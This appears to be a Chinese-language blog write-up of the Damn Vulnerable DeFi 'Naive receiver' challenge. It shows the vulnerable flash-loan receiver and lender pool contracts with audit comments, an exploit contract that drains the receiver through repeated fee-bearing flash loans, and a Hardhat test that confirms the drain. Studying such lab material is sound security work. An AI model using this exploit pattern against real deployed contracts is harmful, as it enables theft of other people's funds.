---
title: '合约审计-2'
date: 2022-12-27 14:42:15
tags:
- '区块链技术'
- '智能合约审计'
categories:
- '智能合约安全'

---

<!-- more -->

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * 闪电贷接收合约
 */
contract FlashLoanReceiver {
    using Address for address payable;

    address payable private pool;

    constructor(address payable poolAddress) {
        pool = poolAddress;
    }

    // Function called by the pool during flash loan
    function receiveEther(uint256 fee) public payable {
        /*
        POC:
        限制必须为借款池才能调用此方法,但是贷款池的闪电贷函数并没有限制外部调用.
        所以此处没有限制接收借款次数就是有问题的,如果有人拿到了此接收合约的地址,
        随后为此合约调用多次借款函数,那么此合约的余额就会被耗尽
        */
        require(msg.sender == pool, "Sender must be pool");

        uint256 amountToBeRepaid = msg.value + fee;
        //限制借款金额为合约余额+手续费
        require(
            address(this).balance >= amountToBeRepaid,
            "Cannot borrow that much"
        );

        _executeActionDuringFlashLoan();

        // Return funds to pool
        pool.sendValue(amountToBeRepaid);
    }

    // Internal function where the funds received are used
    function _executeActionDuringFlashLoan() internal {}

    // Allow deposits of ETH
    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title NaiveReceiverLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * 贷款池合约
 */
contract NaiveReceiverLenderPool is ReentrancyGuard {
    using Address for address;

    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    function fixedFee() external pure returns (uint256) {
        return FIXED_FEE;
    }

    //闪电贷函数,每次借款手续费1ETH
    function flashLoan(
        address borrower,
        uint256 borrowAmount
    ) external nonReentrant {
        //校验此贷款池余额
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");
        //校验调用闪电贷的是否为合约,并call接收合约receive函数
        require(borrower.isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        borrower.functionCallWithValue(
            abi.encodeWithSignature("receiveEther(uint256)", FIXED_FEE),
            borrowAmount
        );

        require(
            address(this).balance >= balanceBefore + FIXED_FEE,
            "Flash loan hasn't been paid back"
        );
    }

    // Allow deposits of ETH
    receive() external payable {}
}

```

##### EXP:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract hackReceiver {
    NaiveReceiverLenderPool public pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address receiver, uint256 borowTimes) public {
        for (uint i = 0; i < borowTimes; i++) {
            pool.flashLoan(receiver, 0);
        }
    }
}
```

##### EXP运行环境:

```js
const { ethers } = require('hardhat')
const { expect } = require('chai')
/*
  在以下条件下运行 naive-receiver 文件夹内的合约
*/
describe('[Challenge] Naive receiver', function () {
  let deployer, user, attacker

  // Pool has 1000 ETH in balance
  const ETHER_IN_POOL = ethers.utils.parseEther('1000')

  // Receiver has 10 ETH in balance
  const ETHER_IN_RECEIVER = ethers.utils.parseEther('10')

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    ;[deployer, user, attacker] = await ethers.getSigners()

    const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer)
    const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer)
    //部署贷款池合约并发送1000ETH
    this.pool = await LenderPoolFactory.deploy()
    await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL })

    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL)
    expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'))
    //部署接收合约并发送10ETH
    this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address)
    await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER })

    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER)

    this.hack = await (await ethers.getContractFactory('hackReceiver', attacker)).deploy(this.pool.address)
  })
  //运行恶意合约耗尽接收合约余额
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    this.hack.connect(attacker).attack(this.receiver.address, 10)
  })

  after(async function () {
    /** SUCCESS CONDITIONS */

    // All ETH has been drained from the receiver
    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal('0')
    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER))
  })
})

```

